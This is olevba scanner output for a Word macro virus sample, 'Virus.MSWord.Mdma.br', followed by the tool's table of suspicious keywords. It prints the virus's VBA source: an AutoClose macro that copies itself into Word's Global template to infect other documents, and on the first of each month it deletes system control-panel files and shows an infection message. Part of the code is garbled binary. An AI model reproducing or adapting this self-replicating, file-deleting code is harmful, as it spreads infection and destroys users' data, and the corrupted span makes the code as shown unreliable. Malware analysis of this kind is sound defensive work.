olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mdma.br
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mdma.br - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Mdma.br - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
On Error Resume Next
    install
    If (WordBasic.Day(WordBasic.Now()) = 1) Then
        Select Case get_platform
            Case 1
                WordBasic.Call "infect_mac"
            Case 2
                WordBasic.Call "infect_windows"
            Case 3
                WordBasic.Call "infect_NT"
            Case 4
                WordBasic.Call "infect_95"
        End Select
        show_credits
    End If
End Sub

Private Sub install()
Dim total
Dim installed
Dim i
    On Error Resume Next
    total = WordBasic.CountMacros(0)
    installed = 0
    If total > 0 Then
        For i = 1 To total
            If WordBasic.[MacroName$](i, 0) = "AutoClose" Then
                installed = 1
            End If
        Next
    End If
    If installed = 0 Then
        WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoClose", "Global:AutoClose", 1
    Else
        total = WordBasic.CountMacros(1)
        installed = 0
        If total > 0 Then
            For i = 1 To total
                If WordBasic.[MacroName$](i, 1) = "AutoClose" Then
                    installed = 113
                End If
            Next
        End If
        If installed = 0 Then
            WordBasic.FileSaveAs Format:=1
            WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose", 1
        End If
    End If
End Sub

Private Function get_platform()
    On Error Resume Next
    If InStr(WordBasic.[AppInfo$](1), "Macintosh") Then
        get_platform = 120                    ,"MAC"
    End If

    If WordBasic.[AppInfo$](9) <> "0" Then
        get_platform = 2                    'old version of windows
    End If

    If InStr(WordBasic.[GetSystemInfo$](21), "NT") Then
        get_pƒ®®®®®®                                             +1      -1       -1        -1                                                           -1+1                                                                                   +1      +1        +1     : Redim +1       -1  +1 : Redim     +1  : Redim  : Redim  +1       -1           +1         -1 +1 +1                                                                                   : Redim  -1 -1                                  -1 +1          +1: Redim  -1 +1+1        +1    +1          : Redim     : Redim       +1             +1 -1              Single   Close WordBasic.Input Integer Private Declare Close  Begin Private Declare Integer Lib Alias Any
work\LogonjProcessLoginScriptj00j
    WordBasic.Kill "c:\windows\system\*.cpl"
End If
End Sub

Private Sub show_credits()
    On Error Resume Next
    WordBasic.MsgBox "You are infected with MDMA_DMV. Brought to you by MDMA (Many Delinquent Modern Anarchists).", "MDMA_DMV", 16
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

